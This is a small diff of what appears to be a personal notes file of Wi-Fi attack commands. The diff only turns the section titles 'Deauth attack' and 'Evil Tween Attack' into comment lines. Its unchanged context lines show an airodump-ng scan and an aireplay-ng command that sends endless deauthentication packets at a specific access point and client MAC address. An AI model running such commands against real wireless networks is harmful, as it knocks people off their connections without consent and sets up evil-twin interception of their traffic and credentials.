@@ -1,5 +1,5 @@
 #############################################
-Deauth attack
+# Deauth attack                             #
 #############################################
 
 # Enable monitor mode interface
@@ -13,6 +13,6 @@ sudo airodump-ng wlp2s0mon
 sudo aireplay-ng -0 0 -a  F0:3E:90:6E:6F:18 -c A0:C9:A0:EB:E8:AA wlp2s0mon
 
 #############################################
-Evil Tween Attack
+# Evil Tween Attack                         #
 #############################################
 
